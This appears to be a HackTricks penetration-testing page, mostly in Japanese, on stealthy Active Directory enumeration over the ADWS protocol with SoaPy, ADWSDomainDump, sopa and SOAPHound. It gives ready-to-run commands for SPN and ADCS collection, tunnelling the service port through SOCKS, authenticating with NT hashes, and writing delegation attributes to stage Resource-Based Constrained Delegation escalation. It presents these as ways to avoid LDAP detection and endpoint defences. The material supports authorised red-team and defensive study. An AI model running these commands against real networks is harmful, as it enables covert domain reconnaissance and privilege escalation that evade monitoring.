# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) は、Windows Server 2008 R2 以降のすべてのドメインコントローラーでデフォルトで有効になっており、TCP **9389** をリッスンします。名前に反して **HTTP は関与しません**。代わりに、このサービスは LDAP 風のデータを独自の .NET フレーミングプロトコルスタックを通じて公開します:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

これらのバイナリ SOAP フレーム内にトラフィックがカプセル化され、あまり一般的でないポートを通るため、**ADWS による列挙は従来の LDAP/389 & 636 トラフィックよりも検査・フィルタ・シグネチャ付けされにくい**です。オペレーターにとっての利点は以下の通りです:

* ステルス性の高いリコン — Blue teams はしばしば LDAP クエリに注力します。
* SOCKS プロキシ経由で 9389/TCP をトンネリングすることで **非 Windows ホスト（Linux、macOS）からの収集が可能**。
* LDAP で得られるのと同じデータ（users、groups、ACLs、schema 等）と、**writes** を行える能力（例: `msDs-AllowedToActOnBehalfOfOtherIdentity` による **RBCD**）。

ADWS とのやり取りは WS-Enumeration 上で行われます：すべてのクエリは LDAP フィルタ／属性を定義する `Enumerate` メッセージで始まり、`EnumerationContext` GUID を返し、その後サーバー定義の結果ウィンドウまでをストリームする 1 回以上の `Pull` メッセージが続きます。Contexts は約 30 分で期限切れになるため、ツールは結果をページングするかフィルタを分割（CN ごとのプレフィックスクエリ）して状態を失わないようにする必要があります。セキュリティ記述子を要求する際は、SACL を省くために `LDAP_SERVER_SD_FLAGS_OID` コントロールを指定してください。そうしないと ADWS は SOAP レスポンスから単に `nTSecurityDescriptor` 属性を落とします。

> NOTE: ADWS は多くの RSAT GUI / PowerShell ツールでも使用されるため、トラフィックが正当な管理者アクティビティと混ざる可能性があります。

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) は **純粋な Python による ADWS プロトコルスタックの完全な再実装** です。NBFX/NBFSE/NNS/NMF フレームをバイト単位で構築するため、.NET ランタイムに触れずに Unix 系システムからの収集が可能です。

### Key Features

* **SOCKS 経由のプロキシ**をサポート（C2 インプラントから有用）。
* LDAP の `-q '(objectClass=user)'` と同一の細かい検索フィルタ。
* オプションの **write** 操作（ `--set` / `--delete` ）。
* BloodHound に直接取り込める **BOFHound output mode**。
* 人間の可読性が必要な場合のためのタイムスタンプ / `userAccountControl` を整形する `--parse` フラグ。

### Targeted collection flags & write operations

SoaPy には ADWS 上で最も一般的な LDAP ハンティングタスクを再現するキュレートされたスイッチが同梱されています: `--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds`、およびカスタム取得用の生の `--query` / `--filter` ノブ。これらを `--rbcd <source>`（`msDs-AllowedToActOnBehalfOfOtherIdentity` を設定）、`--spn <service/cn>`（ターゲット Kerberoasting 用の SPN ステージング）、`--asrep`（`userAccountControl` の DONT_REQ_PREAUTH を反転）などの書き込みプリミティブと組み合わせます。

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
同じホスト/資格情報を使用して発見を直ちにweaponise: `--rbcds` で RBCD-capable objects をダンプし、次に `--rbcd 'WEBSRV01$' --account 'FILE01$'` を適用して Resource-Based Constrained Delegation チェーンをステージします（完全な悪用経路は [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照）。

### インストール（オペレーターホスト）
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump` のフォークで、LDAP クエリを ADWS 呼び出し（TCP/9389）に置き換え、LDAP シグネチャによる検出を減らします。
* 初回にポート 9389 への到達確認を行います。`--force` が指定されている場合はスキップします（ポートスキャンがノイジー／フィルタリングされている場合はプローブをスキップ）。
* README には Microsoft Defender for Endpoint と CrowdStrike Falcon に対してバイパスに成功したテストが記載されています。

### インストール
```bash
pipx install .
```
### 使用方法
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
典型的な出力は、9389 reachability check、ADWS bind、および dump の開始/終了をログに記録します:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - A practical client for ADWS in Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Protocol mapping highlights

* LDAP-style searches are issued via **WS-Enumeration** (`Enumerate` + `Pull`) with attribute projection, scope control (Base/OneLevel/Subtree) and pagination.
* Single-object fetch uses **WS-Transfer** `Get`; attribute changes use `Put`; deletions use `Delete`.
* Built-in object creation uses **WS-Transfer ResourceFactory**; custom objects use an **IMDA AddRequest** driven by YAML templates.
* Password operations are **MS-ADCAP** actions (`SetPassword`, `ChangePassword`).

### Unauthenticated metadata discovery (mex)

ADWS exposes WS-MetadataExchange without credentials, which is a quick way to validate exposure before authenticating:
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery & Kerberos targeting に関する注意事項

Sopaは`--dc`が省略され、`--domain`が指定されている場合、SRV経由でDCを解決できます。  
以下の順序で問い合わせを行い、最も優先度の高いターゲットを使用します:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
運用上、セグメント化された環境での失敗を避けるため、DC 制御のリゾルバを優先してください：

* `--dns <DC-IP>` を使用して、**すべての** SRV/PTR/forward lookups が DC の DNS を経由するようにします。
* UDP がブロックされているか SRV の応答が大きい場合は `--dns-tcp` を使用してください。
* Kerberos が有効で `--dc` が IP の場合、sopa は正しい SPN/KDC ターゲティングのために FQDN を取得する目的で **reverse PTR** を実行します。Kerberos を使用しない場合は PTR 検索は行われません。

Example (IP + Kerberos, forced DNS via the DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### 認証情報のオプション

plaintext passwords の他に、sopa は **NT hashes**, **Kerberos AES keys**, **ccache**, および **PKINIT certificates** (PFX or PEM) を ADWS auth 用の認証としてサポートします。Kerberos は `--aes-key`、`-c` (ccache) または証明書ベースのオプションを使用する場合に暗黙的に適用されます。
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### テンプレートによるカスタムオブジェクト作成

任意のオブジェクトクラスに対して、`create custom` コマンドは IMDA の `AddRequest` に対応する YAML テンプレートを受け取ります:

* `parentDN` と `rdn` はコンテナと相対 DN を定義します。
* `attributes[].name` は `cn` か名前空間付きの `addata:cn` をサポートします。
* `attributes[].type` は `string|int|bool|base64|hex` または明示的な `xsd:*` を受け付けます。
* `ad:relativeDistinguishedName` や `ad:container-hierarchy-parent` を含めないでください; sopa がそれらを注入します。
* `hex` の値は `xsd:base64Binary` に変換されます。空文字列を設定するには `value: ""` を使用してください。

## SOAPHound – 大量収集向け ADWS コレクション (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) は .NET 製のコレクタで、すべての LDAP 相互作用を ADWS 内に留め、BloodHound v4 互換の JSON を出力します。`objectSid`, `objectGUID`, `distinguishedName` と `objectClass` を一度だけ完全にキャッシュ (`--buildcache`) し、その後は高ボリュームの `--bhdump`, `--certdump` (ADCS), または `--dnsdump` (AD-integrated DNS) 実行時に再利用するため、DC からは約35個の重要属性のみが流出します。AutoSplit (`--autosplit --threshold <N>`) は大規模フォレストで EnumerationContext の 30 分タイムアウトを超えないように、CN プレフィックスごとにクエリを自動的に分割します。

ドメインに参加したオペレータ VM 上での典型的なワークフロー:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON slots directly into SharpHound/BloodHound workflows—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit makes SOAPHound resilient on multi-million object forests while keeping the query count lower than ADExplorer-style snapshots.

## ステルスな AD 収集ワークフロー

以下のワークフローは、ADWS経由で**ドメイン & ADCS オブジェクト**を列挙し、それらを BloodHound JSON に変換して証明書ベースの攻撃パスを探索する方法を示します — すべて Linux から実行します:

1. **Tunnel 9389/TCP** をターゲットネットワークから自分のマシンへ（例: Chisel, Meterpreter, SSH dynamic port-forward などを使用）。`export HTTPS_PROXY=socks5://127.0.0.1:1080` をエクスポートするか、SoaPy の `--proxyHost/--proxyPort` を使用します。

2. **ルートドメインオブジェクトを収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC から ADCS 関連オブジェクトを収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHoundに変換する:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP を BloodHound GUI にアップロード**し、`MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` のような cypher queries を実行して証明書のエスカレーション経路（ESC1、ESC8 など）を明らかにします。

### `msDs-AllowedToActOnBehalfOfOtherIdentity` の書き込み (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combine this with `s4u2proxy`/`Rubeus /getticket` for a full **Resource-Based Constrained Delegation** chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## ツール概要

| 目的 | ツール | 備考 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch のログを変換 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 同じ SOCKS 経由でプロキシ可能 |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | 既知の ADWS エンドポイントとやり取りする汎用クライアント — 列挙、オブジェクト作成、属性変更、パスワード変更が可能 |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
